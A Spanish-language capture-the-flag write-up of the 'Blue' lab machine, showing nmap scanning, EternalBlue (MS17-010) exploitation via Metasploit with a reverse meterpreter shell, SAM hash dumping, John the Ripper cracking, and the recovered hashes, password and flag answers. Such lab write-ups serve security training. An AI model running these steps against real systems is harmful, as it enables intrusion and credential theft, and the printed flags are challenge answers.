# Write-up: Blue

**Autor**: Asier González

## Reconocimiento

La fase de reconocimiento comenzó con un escaneo completo de puertos, servicios y versiones mediante `nmap`:

```bash
db_nmap -sC -sV -p- -T4 IP
```

[Escaneo de puertos](images/nmap-p.png)

A continuación, ejecuté un escaneo orientado a vulnerabilidades para identificar posibles vectores de entrada:

```bash
db_nmap -sV --script vuln IP
```

[Detección de MS17-010](images/ms17.png)

Los resultados mostraron que el sistema era vulnerable a `MS17-010`, una vulnerabilidad crítica de SMB asociada al exploit EternalBlue.

Para localizar un módulo adecuado en Metasploit, hice la siguiente búsqueda:

```bash
search smb ms17 010
```

Seleccioné el módulo de EternalBlue:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

[Selección del exploit](images/exploit.png)

## Explotación

Una vez cargado el módulo, configuré los parámetros necesarios:

- `RHOSTS`: IP de la máquina víctima.
- `PAYLOAD`: `windows/x64/meterpreter/reverse_tcp`.
- `LHOST`: IP de mi interfaz VPN (`tun0`).

Después lancé el exploit:

```bash
run
```

También puede ejecutarse con:

```bash
exploit
```

Si la explotación tiene éxito, puedes conseguir una shell `meterpreter` sobre la máquina objetivo.

Nota: este exploit puede fallar en algunos intentos, por lo que puede ser necesario ejecutarlo varias veces hasta que funcione.

[Sesión de meterpreter](images/meterpreter-in.png)

## Escalada de privilegios

En este caso, la explotacion de `MS17-010` proporciona acceso directamente con privilegios elevados, por lo que no es necesaria una fase adicional de escalada manual.

## Post-explotación

### Verificación de privilegios

Una vez dentro de la máquina, comprobé mis privilegios o usuario:

```bash
getuid
```

En este caso, obtuve acceso directamente con privilegios de systema:
NT AUTHORITY\SYSTEM.

[Privilegios obtenidos](images/root.png)

### Extracción de hashes

Como parte de la fase de post-explotación, extraje los hashes de los usuarios locales. Como tenía privilegios elevados, no hubo problemas:

```bash
hashdump
```

[Volcado de hashes](images/hashdump.png)

### Preparación para crackeo

Con los hashes obtenidos, el siguiente paso fue crackearlos. En mi caso usé John the Ripper.
Lo primero que hice fue convertir esos hashes en archivos de texto para pasárselos a John.

```bash
echo "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::" > hash.txt
echo "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::" >> hashguest.txt
echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::" >> hashjon.txt
```

[Hashes exportados](images/toHashTxt.png)

Observé que tanto `Administrator` como `Guest` comparten el valor:

```text
31d6cfe0d16ae931b73c59d7e0c089c0
```

Esto normalmente es indicativo de que tienen la contraseña en blanco.

### Crackeo de contraseñas

La wordlist que usé fue `rockyou`, y el comando utilizado fue:

```bash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

[Contraseña de Administrator](images/pass_admin.png)
[Contraseña de Jon](images/pass_jon.png)

El único usuario con contraseña definida era `Jon`, cuya contraseña es:

```text
alqfna22
```

## Obtención de flags

El siguiente paso fue localizar las flags.

Desde la shell de meterpreter hice: `pwd` para ver donde estaba.

```bash
pwd
```

Me moví al directorio principal `cd /` e hice un `ls` para ver los archivos.

```bash
cd /
ls
```

Allí encontré la primera flag, almacenada en `flag1.txt`.

[Ubicación de la primera flag](images/flag1.png)

La leí con:

```bash
cat flag1.txt
```

[Lectura de flag1](images/catFlag1.png)

Al ser una máquina fácil, supuse que respetaría el mismo formato de archivo, así que decidí hacer una búsqueda en el sistema con `search -f flag*.txt` y obtuve la dirección de todas las flags.

```bash
search -f flag*.txt
```

[Búsqueda de flags](images/searchflags.png)

Con las rutas identificadas, solo me quedaba acceder a cada ubicación y leer los archivos:

[Lectura de flag2](images/catflag2.png)
[Lectura de flag3](images/catflag3.png)

## Resultado

### Flags

- `flag1`: `flag{access_the_machine}`
- `flag2`: `flag{sam_database_elevated_access}`
- `flag3`: `flag{admin_documents_can_be_valuable}`

### Hashes obtenidos

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

### Credencial recuperada

- `Jon`: `alqfna22`
